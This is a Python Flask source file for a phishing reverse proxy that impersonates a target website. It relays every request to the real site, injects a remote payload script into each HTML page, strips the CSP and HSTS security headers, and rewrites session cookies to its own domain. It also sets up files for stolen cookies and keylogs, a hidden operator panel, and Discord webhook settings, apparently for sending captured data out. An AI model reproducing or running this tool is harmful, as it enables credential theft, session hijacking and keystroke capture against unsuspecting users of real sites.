from flask import Flask, request, Response, send_from_directory, jsonify
import requests
import json
import os
from datetime import datetime
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from colorama import Fore
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None

def initialize_discord_bot():
    global discord_bot
    settings = db.get_discord_settings()
    if settings['discord_webhook'] and settings['discord_token']:
        try:
            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")

def ensure_json_files():
    files = ['cookies.json', 'keylogs.json']
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump([], f)

ensure_json_files()
initialize_discord_bot()

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')
    
    # Create a session for reuse
    session = requests.Session()
    session.verify = False

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/{secret}/<path:filename>')
    def panel_files(filename):
        return send_from_directory('panel', filename)

    @app.route('/payload-script.js')
    def serve_payload():
        return send_from_directory('.', 'payload-script.js')

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        if path.startswith(secret):
            if path == secret:
                return panel_index()
            filename = path[len(secret)+1:]
            return panel_files(filename)

        try:
            # Build target URL
            target_url = f"https://{target}/{path}"
            if request.query_string:
                target_url += f"?{request.query_string.decode()}"

            print(f"{Fore.CYAN}[*] Proxying request to: {target_url}{Fore.RESET}")

            # Prepare headers
            headers = {
                key: value for key, value in request.headers.items()
                if key.lower() not in ['host', 'content-length', 'content-encoding']
            }
            headers['Host'] = target
            headers['Origin'] = f'https://{target}'
            headers['Referer'] = f'https://{target}/'

            # Handle POST data properly
            data = None
            if request.method == 'POST':
                if request.is_json:
                    data = request.get_json()
                else:
                    data = request.form.to_dict()

            # Forward the request
            resp = session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=data,
                cookies=request.cookies,
                allow_redirects=True,
                verify=False
            )

            # Process the response
            content = resp.content
            if 'text/html' in resp.headers.get('Content-Type', '').lower():
                try:
                    content = content.decode()
                    payload = '<script src="/payload-script.js"></script>'
                    if '</head>' in content:
                        content = content.replace('</head>', f'{payload}</head>')
                    elif '<body>' in content:
                        content = content.replace('<body>', f'<body>{payload}')
                    content = content.encode()
                except:
                    pass

            # Prepare response headers
            excluded_headers = [
                'content-encoding', 
                'content-length', 
                'transfer-encoding', 
                'connection',
                'strict-transport-security',
                'content-security-policy'
            ]
            
            headers = [
                (k, v) for k, v in resp.headers.items()
                if k.lower() not in excluded_headers
            ]

            # Create response
            response = Response(content, resp.status_code, headers)

            # Handle cookies
            for cookie in resp.cookies:
                response.set_cookie(
                    key=cookie.name,
                    value=cookie.value,
                    domain=request.host,
                    path=cookie.path or '/'
                )

            return response

        except Exception as e:
            print(f"{Fore.RED}[!] Proxy Error: {str(e)}{Fore.RESET}")
            return str(e), 500

    # Keep your existing API routes here
    @app.route('/ep/api/settings', methods=['GET', 'POST'])
    def handle_settings():
        if request.method == 'POST':
            data = request.json
            db.save_discord_settings(
                data.get('discord_webhook', ''),
                data.get('discord_token', '')
            )
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify(db.get_discord_settings()), 200

    print(f"\n{Fore.GREEN}[+] Panel URL: http://{host}:{port}/{secret}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Proxy running on http://{host}:{port}/{Fore.RESET}")
    
    app.run(host='0.0.0.0', port=port, threaded=True)